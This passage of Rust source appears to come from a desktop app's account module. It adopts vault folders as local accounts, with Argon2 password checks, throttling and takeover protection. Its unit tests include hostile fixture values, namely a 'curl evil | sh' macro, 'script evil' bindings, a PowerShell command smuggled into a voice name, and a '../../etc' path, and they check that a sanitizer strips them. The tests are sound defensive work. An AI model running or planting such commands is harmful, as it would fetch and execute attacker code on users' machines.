            Some(s) => s.read(rel).ok().map(|d| d.to_vec()),
            None => fs::read(path.join(rel)).ok(),
        }
    };
    (
        read(CARD).and_then(|b| serde_json::from_slice(&b).ok()),
        read(VAULT_SETTINGS).and_then(|b| serde_json::from_slice(&b).ok()),
        if store.is_some() { read(VAULT_SECRETS).map(|b| String::from_utf8_lossy(&b).into_owned()) } else { None },
    )
}

/// The account of a vault opened on this computer: found (by its uid, or its
/// name and password) or made, its settings taken from the vault, unlocked.
/// Making one needs an account of this deck to approve it (like + new account).
fn adopt_vault(
    app: &AppHandle,
    state: &State<AccountState>,
    vault: &State<VaultState>,
    path: &Path,
    user: &str,
    password: &str,
    approver: Option<(&str, &str)>,
    bits: (Option<Card>, Option<serde_json::Value>, Option<String>),
    mut write_card: impl FnMut(&Card) -> Result<(), String>,
) -> Result<AccountInfo, String> {
    let (card, settings, secrets) = bits;
    // read through the vault's key (an encrypted vault): only its password wrote these
    let trusted_vault = crate::store::is_encrypted(path);
    let mut all = load(app)?;
    let uid = card.as_ref().map(|c| c.uid.clone()).filter(|u| !u.is_empty());
    let mine = all.accounts.iter().position(|a| uid.as_deref() == Some(a.uid.as_str()));
    let same_name = all.accounts.iter().position(|a| norm(&a.user) == norm(user));
    // an account to make, or to take over, needs an account of this deck to approve it
    let approve = |all: &Accounts| -> Result<(), String> {
        let (au, ap) = approver.unwrap_or(("", ""));
        throttle(state, au);
        let ok = find(all, au, ap).is_some();
        record(state, au, ok);
        if ok { Ok(()) } else { Err("an account of this deck must approve it (its name and password)".into()) }
    };
    let i = match (mine, same_name) {
        (Some(i), _) => {
            // The vault's card names an account of this computer. A card is only a file: a
            // vault made by someone else could carry your account's uid with THEIR password,
            // and take your account over. So it's yours only if the password is already this
            // account's, or the vault is the one its settings name — else an account of this
            // deck approves, like a new account.
            let acc = &all.accounts[i];
            let known_password = PasswordHash::new(&acc.hash).map(|h| Argon2::default().verify_password(password.as_bytes(), &h).is_ok()).unwrap_or(false);
            let its_vault = user_dir(app, &acc.id)
                .ok()
                .and_then(|d| fs::read_to_string(d.join("settings.json")).ok())
                .and_then(|t| serde_json::from_str::<serde_json::Value>(&t).ok())
                .and_then(|v| v.pointer("/vault/path").and_then(|p| p.as_str()).map(PathBuf::from))
                .and_then(|p| p.canonicalize().ok());
            let known_place = its_vault.is_some() && its_vault == path.canonicalize().ok();
            if !known_password && !known_place {
                approve(&all)?;
            }
            i
        }
        (None, Some(_)) => return Err(format!("there's already an account named {} on this computer (another one): rename one of them first", user.trim())),
        (None, None) => {
            if !all.accounts.is_empty() {
                approve(&all)?;
            }
            let taken: Vec<&str> = all.accounts.iter().map(|a| a.id.as_str()).collect();
            let id = slug(user, &taken);
            all.accounts.push(Account { id, user: user.trim().to_string(), hash: String::new(), created: now_ms() / 1000, uid: uid.clone().unwrap_or_else(new_uid) });
            all.accounts.len() - 1
        }
    };
    // the vault proved the password: this computer's account takes it
    all.accounts[i].hash = hash(password)?;
    if let Some(c) = &card {
        let name = c.user.trim();
        let free = !all.accounts.iter().enumerate().any(|(j, x)| j != i && norm(&x.user) == norm(name));
        if !name.is_empty() && name.chars().count() <= 64 && free {
            all.accounts[i].user = name.to_string();
        }
    }
    save(app, &all)?;
    let a = all.accounts[i].clone();
    let dir = user_dir(app, &a.id)?;
    // its settings: the vault's (where it is on this computer added), else what this computer
    // had. A plain vault brings only the safe part (never keys, macros, the module list…).
    let had: serde_json::Value = fs::read_to_string(dir.join("settings.json")).ok().and_then(|t| serde_json::from_str(&t).ok()).unwrap_or(serde_json::json!({}));
    let mut s = match settings {
        Some(v) if trusted_vault => v,
        Some(v) => plain_safe(&v, &had),
        None => had,
    };
    if let Some(o) = s.as_object_mut() {
        o.entry("vault").or_insert_with(|| serde_json::json!({}));
        if let Some(vo) = o.get_mut("vault").and_then(|x| x.as_object_mut()) {
            vo.insert("path".into(), serde_json::json!(path.to_string_lossy()));
        }
        o.insert("_saved".into(), serde_json::json!(now_ms()));
    }
    write_private(&dir.join("settings.json"), &serde_json::to_string_pretty(&s).map_err(|e| e.to_string())?)?;
    if let Some(sec) = secrets {
        write_private(&dir.join("secrets.json"), &sec)?;
    }
    write_card(&Card::of(&a))?;
    open_session(state, &a.id);
    vault::offer_password(vault, password);
    Ok(AccountInfo { id: a.id, user: a.user })
}

/// Login page, "open a vault": a vault folder (a USB key, another computer's
/// vault, plain or encrypted) + its account's name and password → that account
/// on this computer, with its settings. A vault no account opened yet becomes
/// this name's (its password is the one given).
#[tauri::command(async)]
pub fn account_open_vault(app: AppHandle, state: State<AccountState>, vault: State<VaultState>, path: String, user: String, password: String, approver: Option<String>, approver_password: Option<String>) -> Result<AccountInfo, String> {
    let password = Zeroizing::new(password);
    let approver_password = approver_password.map(Zeroizing::new);
    let appr = approver.as_deref().map(|u| (u, approver_password.as_ref().map(|p| p.as_str()).unwrap_or("")));
    validate(&user, &password)?;
    let path = expand(&app, &path)?;
    vault::settle(&vault, &path);
    let wrong = || "that name and password don't open this vault".to_string();
    if crate::store::is_encrypted(&path) {
        throttle(&state, &user);
        let mut st = match crate::store::Store::unlock(&path, &password) {
            Ok(s) => s,
            Err(e) if e.contains("newer") => return Err(e),
            Err(_) => {
                record(&state, &user, false);
                return Err(wrong());
            }
        };
        record(&state, &user, true);
        let bits = vault_bits(&path, Some(&st));
        if bits.0.as_ref().is_some_and(|c| norm(&c.user) != norm(&user)) {
            return Err(wrong());
        }
        adopt_vault(&app, &state, &vault, &path, &user, &password, appr, bits, |c| st.write(CARD, serde_json::to_string_pretty(c).unwrap_or_default().as_bytes()))
    } else {
        let bits = vault_bits(&path, None);
        if let Some(c) = &bits.0 {
            throttle(&state, &user);
            let ok = norm(&c.user) == norm(&user) && sane(&c.hash) && PasswordHash::new(&c.hash).map(|h| Argon2::default().verify_password(password.as_bytes(), &h).is_ok()).unwrap_or(false);
            record(&state, &user, ok);
            if !ok {
                return Err(wrong());
            }
        }
        let p = path.clone();
        adopt_vault(&app, &state, &vault, &path, &user, &password, appr, bits, move |c| {
            let f = p.join(CARD);
            fs::create_dir_all(f.parent().unwrap()).map_err(|e| e.to_string())?;
            crate::crypto::write_atomic(&f, serde_json::to_string_pretty(c).unwrap_or_default().as_bytes()).map_err(|e| e.to_string())
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hash_roundtrip_and_never_plain() {
        let h = hash("correct horse battery").unwrap();
        assert!(h.starts_with("$argon2id$") && h.contains("m=65536,t=3"));
        assert!(!weak(&h));
        assert!(weak("$argon2id$v=19$m=19456,t=2,p=1$c2FsdHNhbHRzYWx0$aGFzaGhhc2hoYXNoaGFzaGhhc2hoYXNoaGFzaGhhc2g"));
        assert!(!h.contains("correct horse"));
        let acc = Account { id: "neo".into(), user: "Neo".into(), hash: h, created: 0, uid: new_uid() };
        assert!(check(&acc, " neo ", "correct horse battery"));
        assert!(!check(&acc, "neo", "correct horse batterY"));
        assert!(!check(&acc, "trinity", "correct horse battery"));
    }

    #[test]
    fn ids_are_folder_safe_and_unique() {
        assert_eq!(slug("Neo Anderson", &[]), "neo-anderson");
        assert_eq!(slug("neo", &["neo"]), "neo-2");
        assert_eq!(slug("../../etc", &[]), "etc");
        assert_eq!(slug("日本", &[]), "user");
    }

    #[test]
    fn a_plain_vault_never_brings_commands_or_a_forged_hash() {
        let local = serde_json::json!({ "keys": { "ctrl+1": "todo" }, "plugins": { "enabled": [] }, "home": { "widgets": ["a"], "links": [] }, "appearance": { "theme": "old" } });
        let theirs = serde_json::json!({
            "keys": { "enter": "script evil" }, "menu": { "keys": { "x": "script evil" } }, "shell": { "macros": [{ "label": "x", "cmd": "curl evil | sh" }] },
            "plugins": { "enabled": ["evil"] }, "favorites": [{ "kind": "command", "cmd": "script evil" }], "updates": { "endpoint": "https://evil" },
            "voice": { "name": "a\u{2019}); Set-Content evil; (\u{2018}b" },
            "home": { "widgets": ["b"], "links": [{ "cmd": "script evil" }] }, "appearance": { "theme": "new" }
        });
        let out = plain_safe(&theirs, &local);
        // what's safe comes: the look, the HOME layout
        assert_eq!(out["appearance"]["theme"], "new");
        assert_eq!(out["home"]["widgets"][0], "b");
        // what holds commands stays this computer's (or is dropped when it had none)
        assert_eq!(out["keys"], local["keys"]);
        assert_eq!(out["plugins"], local["plugins"]);
        assert_eq!(out["home"]["links"], local["home"]["links"]);
        for gone in ["menu", "shell", "favorites", "updates", "voice"] {
            assert!(out.get(gone).is_none(), "{gone}");
        }
        assert!(!out.to_string().contains("evil"));
        // a card's hash: only a cost ICEBREAKER could have made
        assert!(sane(&hash("correct horse battery").unwrap()));
        assert!(!sane("$argon2id$v=19$m=4194304,t=3,p=1$c2FsdHNhbHRzYWx0$aGFzaGhhc2hoYXNoaGFzaGhhc2hoYXNoaGFzaGhhc2g"));
        assert!(!sane("$argon2i$v=19$m=65536,t=3,p=1$c2FsdHNhbHRzYWx0$aGFzaGhhc2hoYXNoaGFzaGhhc2hoYXNoaGFzaGhhc2g"));
        assert!(!sane("not a hash"));
    }

    #[test]
    fn validation() {
        assert!(validate("neo", "short").is_err());
        assert!(validate("  ", "long enough pass").is_err());
        assert!(validate("neo", "long enough pass").is_ok());
    }

    #[test]
    fn waits_are_kept_by_account_and_unknown_names_share_one() {
        let st = AccountState::default();
        *st.known.lock().unwrap() = ["test2".to_string()].into_iter().collect();
        assert_eq!(delay_key(&st, " Test2 "), "test2");
        // a name that isn't an account is never written down: all of them share ""
        assert_eq!(delay_key(&st, "nobody"), "");
        assert_eq!(delay_key(&st, "nobody2"), "");
        // and "" can't be an account's name
        assert!(validate("", "long enough pass").is_err());
        record(&st, "nobody", false);
        record(&st, "nobody2", false);
        let d = st.delays.lock().unwrap();
        // the two guesses counted once, together: 2 failures → 0.5 s
        assert!(d.remaining("", crate::delay::now_ms()) > 250);
        assert_eq!(d.remaining("nobody", crate::delay::now_ms()), 0);
    }
}
